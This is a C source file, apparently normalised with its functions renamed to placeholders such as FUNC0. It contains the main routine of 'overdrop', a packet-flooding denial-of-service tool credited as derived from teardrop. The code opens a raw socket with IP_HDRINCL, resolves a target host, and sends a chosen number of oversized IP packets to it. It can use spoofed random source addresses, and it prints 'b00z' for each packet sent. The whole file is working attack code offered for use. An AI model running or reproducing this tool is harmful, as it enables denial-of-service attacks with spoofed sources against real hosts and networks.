#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  u_short ;
typedef  void* u_long ;
typedef  int /*<<< orphan*/  time_t ;
struct in_addr {void* s_addr; } ;
typedef  int /*<<< orphan*/  one ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int COUNT ; 
 int EOF ; 
 int /*<<< orphan*/  IPPROTO_IP ; 
 int /*<<< orphan*/  IPPROTO_RAW ; 
 int /*<<< orphan*/  IP_HDRINCL ; 
 int /*<<< orphan*/  SOCK_RAW ; 
 int FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ,char*,...) ; 
 int FUNC3 (int,char**,char*) ; 
 char* FUNC4 (struct in_addr) ; 
 void* FUNC5 (char*) ; 
 char* optarg ; 
 int /*<<< orphan*/  FUNC6 (char*) ; 
 void* FUNC7 () ; 
 int /*<<< orphan*/  FUNC8 (int,void*,void*,void*,void*) ; 
 scalar_t__ FUNC9 (int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,char*,int) ; 
 int FUNC10 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC11 (unsigned int) ; 
 int /*<<< orphan*/  stderr ; 
 scalar_t__ FUNC12 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC13 (char*) ; 
 int /*<<< orphan*/  FUNC14 (int) ; 

int FUNC15(int argc, char **argv) {
      int one=1,count=0,i,rip_sock;
      u_long  src_ip=0,dst_ip=0;
      u_short src_prt=0,dst_prt=0;
      struct in_addr addr;
      FUNC2(stderr,"overdrop by lcamtuf [based on teardrop by route|daemon9]\n\n");
      if((rip_sock=FUNC10(AF_INET,SOCK_RAW,IPPROTO_RAW))<0) {
        FUNC6("raw socket");
        FUNC1(1);
      }
      if (FUNC9(rip_sock,IPPROTO_IP,IP_HDRINCL,(char *)&one,sizeof(one))<0) {
        FUNC6("IP_HDRINCL");
        FUNC1(1);
      }
      if (argc < 2) FUNC13(argv[0]);
      if (!(dst_ip=FUNC5(argv[1]))) {
        FUNC2(stderr,"Can't resolve destination address.\n");
        FUNC1(1);
      }
      while ((i=FUNC3(argc,argv,"s:n:"))!=EOF) {
        switch (i) {
	case 'n':
            count   = FUNC0(optarg);
            break;
	case 's':
	  if (!(src_ip=FUNC5(optarg))) {
              FUNC2(stderr,"Can't resolve source address.\n");
              FUNC1(1);
	  }
            break;
	default:
            FUNC13(argv[0]);
            break;
        }
      }
      FUNC11((unsigned)(FUNC12((time_t)0)));
      if (!count) count=COUNT;
      FUNC2(stderr,"Sending oversized packets:\nFrom: ");
      if (!src_ip) FUNC2(stderr,"       (random)"); else {
        addr.s_addr = src_ip;
        FUNC2(stderr,"%15s",FUNC4(addr));
      }
      addr.s_addr = dst_ip;
      FUNC2(stderr,"\n  To: %15s\n",FUNC4(addr));
      FUNC2(stderr," Amt: %5d\n",count);
      FUNC2(stderr,"[ ");
      for (i=0;i<count;i++) {
        if (!src_ip) FUNC8(rip_sock,FUNC7(),dst_ip,FUNC7(),FUNC7()); else
          FUNC8(rip_sock,src_ip,dst_ip,FUNC7(),FUNC7());
        FUNC2(stderr, "b00z ");
        FUNC14(500);
      }
      FUNC2(stderr, "]\n");
      return (0);
}